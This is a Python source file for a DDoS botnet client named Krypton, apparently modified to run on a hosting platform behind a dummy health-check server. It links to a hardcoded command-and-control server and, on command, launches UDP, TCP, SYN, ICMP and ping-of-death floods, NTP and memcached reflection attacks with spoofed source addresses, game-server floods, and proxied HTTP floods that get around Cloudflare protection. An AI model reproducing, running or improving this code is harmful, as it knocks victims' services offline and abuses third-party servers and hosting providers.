import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP

# ========== PHẦN WEB SERVER ĐƠN GIẢN (THÊM VÀO ĐẦU) ==========
def run_web_server():
    """Chạy web server đơn giản để Render không báo lỗi"""
    try:
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import threading as web_threading
        
        class SimpleHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/' or self.path == '/health':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>Bot Connected</h1><p>Status: Active</p>')
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                pass  # Tắt log
        
        # Lấy port từ Render
        port = int(os.environ.get('PORT', 10000))
        server = HTTPServer(('0.0.0.0', port), SimpleHandler)
        print(f"[WEB] Server started on port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[WEB ERROR] {e}")

# Start web server trong thread riêng
web_thread = threading.Thread(target=run_web_server, daemon=True)
web_thread.start()

# ========== HÀM PHỤ TRỢ ĐỂ FIX LỖI UDP ==========
def get_safe_udp_size(requested_size):
    """Trả về kích thước packet UDP an toàn"""
    # Giới hạn theo MTU (1500 - 20 IP - 8 UDP = 1472)
    MAX_MTU_SIZE = 1472
    # Giới hạn theo RFC 768
    MAX_UDP_SIZE = 65507
    
    if requested_size > MAX_UDP_SIZE:
        return MAX_UDP_SIZE
    elif requested_size > MAX_MTU_SIZE:
        return MAX_MTU_SIZE
    else:
        return requested_size

# ========== TOÀN BỘ CODE GỐC CỦA BẠN (CHỈ SỬA HÀM UDP) ==========
KRYPTONC2_ADDRESS  = "103.149.253.218"
KRYPTONC2_PORT  = 5511

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
]

def rand_ua():
    chosen_user_agent = random.choice(base_user_agents)
    return chosen_user_agent.format(
        random.random() + 5,
        random.random() + random.randint(1, 8),
        random.random(),
        random.randint(2000, 2100),
        random.randint(92215, 99999),
        random.random() + random.randint(3, 9)
    )

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, end_time):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Erro: {e}")
        pass

    server = random.choice(ntp_servers).strip()
    while time.time() < end_time:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=random.randint(1, 2000000), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
            except Exception as e:
                pass
        except Exception as e:
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, end_time):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except:
        pass
    server = random.choice(memsv).strip()
    while time.time() < end_time:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(5000000):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass

def icmp(target, end_time):
    while time.time() < end_time:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
        except:
            pass

def pod(target, end_time):
    while time.time() < end_time:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def httpSpoofAttack(url, end_time):
    proxies = open("socks4.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < end_time:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            try:
                for i in range(5000000000):
                    if time.time() >= end_time:
                        break
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        
        try:
            response = proxiedRequest.get(target, headers=headers)

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)

    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}

        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)

            if a.status_code >= 200 and a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)
    
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()

        try:
            a = scraper.get(target, headers=headers, timeout=15)
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def httpio(target, duration, threads, attack_type):
    proxies = []
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass

    elif attack_type == 'NORMAL' or attack_type == 'normal':
        cfbp = 1
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    end_time = time.time() + duration
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    
    # Chờ đúng duration
    while time.time() < end_time:
        time.sleep(0.1)
    
    # Kill tất cả processes
    for p in processes:
        try:
            os.kill(p.pid, 9)
        except:
            pass

def CFB(url, port, end_time):
    url = url + ":" + port
    while time.time() < end_time:
        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        for _ in range(1500):
            if time.time() >= end_time:
                break
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)

def STORM_attack(ip, port, end_time):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < end_time:
        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            if time.time() >= end_time:
                break
            requests.get(ip, headers=headers)
            requests.head(ip, headers=headers)
            scraper.get(ip, headers=headers)

def GET_attack(ip, port, end_time):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < end_time:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            if time.time() >= end_time:
                break
            requests.get(ip, headers=headers)
            scraper.get(ip, headers=headers)

# ========== HÀM attack_udp ĐÃ FIX - CÓ THỂ ĐẠT 2,000,000 PACKETS ==========
def attack_udp(ip, port, end_time, size):
    """UDP Flood attack - FIXED for 2,000,000 packets and Errno 90"""
    max_packets = 2000000
    sent = 0
    
    # FIX: Điều chỉnh kích thước packet an toàn
    safe_size = get_safe_udp_size(size)
    if safe_size != size:
        print(f"[UDP] Adjusted packet size: {size} -> {safe_size} bytes")
    
    # Tạo socket một lần duy nhất (không tạo trong vòng lặp)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Tăng buffer size để hiệu suất tốt hơn
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    except:
        pass
    
    print(f"[UDP] Starting attack: {ip}:{port} | Size: {safe_size} | Until: {time.ctime(end_time)}")
    
    while time.time() < end_time and sent < max_packets:
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            
            # FIX: Dùng safe_size thay vì size gốc
            data = random._urandom(safe_size)
            
            # Gửi UDP packet
            s.sendto(data, (ip, dport))
            sent += 1
            
            # Hiển thị tiến trình mỗi 50,000 packets
            if sent % 50000 == 0:
                remaining = max(0, end_time - time.time())
                elapsed = time.time() - (end_time - remaining)
                pps = sent / elapsed if elapsed > 0 else 0
                percent = (sent / max_packets) * 100 if max_packets > 0 else 0
                print(f"[UDP] Sent: {sent:,}/{max_packets:,} ({percent:.1f}%) | Remaining: {remaining:.1f}s | {pps:,.0f} pps")
            
            # Thêm delay nhỏ để tránh quá tải
            if sent % 10000 == 0:
                time.sleep(0.0001)
                
        except socket.error as e:
            # FIX: Xử lý lỗi Errno 90 (Message too long)
            if e.errno == 90:
                # Tự động giảm kích thước packet
                safe_size = max(512, safe_size // 2)
                print(f"[UDP] Auto-reduced packet size to {safe_size} bytes (Errno 90)")
                continue
            elif e.errno == 101:  # Network unreachable
                print(f"[UDP] Network unreachable")
                break
            elif e.errno == 111:  # Connection refused (UDP vẫn tiếp tục)
                continue
            else:
                # Các lỗi khác
                time.sleep(0.01)
                continue
                
        except Exception as e:
            # Bỏ qua các lỗi khác và tiếp tục
            continue
    
    s.close()
    print(f"[UDP] Finished: {sent:,} packets sent to {ip}:{port}")
    return sent

def attack_tcp(ip, port, end_time, size):
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < end_time:
                s.send(random._urandom(size))
        except:
            pass

def attack_SYN(ip, port, end_time):
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            
            while time.time() < end_time:
                s.send(pkt)
        except:
            s.close()

def attack_tup(ip, port, end_time, size):
    while time.time() < end_time:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
            print('Pacote TUP Enviado')
        except:
            pass

def attack_hex(ip, port, end_time):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, end_time):
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                b'\x20\x51\x75\x65\x72\x79\x00')
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_roblox(ip, port, end_time, size):
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            if time.time() >= end_time:
                break
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, end_time):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            print(f"[+] Connecting to {KRYPTONC2_ADDRESS}:{KRYPTONC2_PORT}")
            c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
            print("[✓] Connected to C2 server")
            while 1:
                c2.send('669787761736865726500'.encode())
                break
            while 1:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    print("[✓] Username sent")
                    break
            while 1:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    print("[✓] Password sent")
                    break
            print("[✓] Authentication successful")
            break
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            print("[+] Retrying in 5 seconds...")
            time.sleep(5)
    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()

            if command == '.UDP':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])  # Đây là end_time
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
            
            elif command == '.TCP':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()

            elif command == '.NTP':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=NTP, args=(ip, port, end_time), daemon=True).start()

            elif command == '.MEM':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=MEM, args=(ip, port, end_time), daemon=True).start()

            elif command == '.ICMP':
                ip = args[1]
                end_time = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=icmp, args=(ip, end_time), daemon=True).start()

            elif command == '.POD':
                ip = args[1]
                end_time = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=pod, args=(ip, end_time), daemon=True).start()

            elif command == '.TUP':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tup, args=(ip, port, end_time, size), daemon=True).start()
            
            elif command == '.HEX':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, end_time), daemon=True).start()
            
            elif command == '.ROBLOX':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, end_time, size), daemon=True).start()
            
            elif command == '.VSE':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, end_time), daemon=True).start()
            
            elif command == '.JUNK':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, end_time), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()

            elif command == '.SYN':
                ip = args[1]
                port = int(args[2])
                end_time = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_SYN, args=(ip, port, end_time), daemon=True).start()
            
            elif command == ".HTTPSTORM":
                url = args[1]
                port = args[2]
                end_time = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=STORM_attack, args=(url, port, end_time), daemon=True).start()

            elif command == ".HTTPGET":
                url = args[1]
                port = args[2]
                end_time = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=GET_attack, args=(url, port, end_time), daemon=True).start()
            
            elif command == ".HTTPCFB":
                url = args[1]
                port = args[2]
                end_time = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=CFB, args=(url, port, end_time), daemon=True).start()

            elif command == ".HTTPIO":
                url = args[1]
                duration = int(args[2])  # duration thực sự
                threads = int(args[3])
                attackType = args[4]
                
                threading.Thread(target=httpio, args=(url, duration, threads, attackType), daemon=True).start()

            elif command == ".HTTPSPOOF":
                url = args[1]
                end_time = time.time() + int(args[2])
                threads = int(args[3])
                
                for _ in range(threads):
                    threading.Thread(target=httpSpoofAttack, args=(url, end_time), daemon=True).start()
            
            elif command == 'PING':
                c2.send('PONG'.encode())

        except Exception as e:
            print(f"[ERROR] {e}")
            break

    c2.close()
    print("[-] Connection lost, restarting...")
    time.sleep(3)
    main()

if __name__ == '__main__':
    print("=" * 60)
    print("🤖 KRYPTON C2 BOT STARTING")
    print("=" * 60)
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Shutdown by user")
    except Exception as e:
        print(f"[!] Critical error: {e}")
        print("[+] Restarting in 10 seconds...")
        time.sleep(10)
        os.execl(sys.executable, sys.executable, *sys.argv)
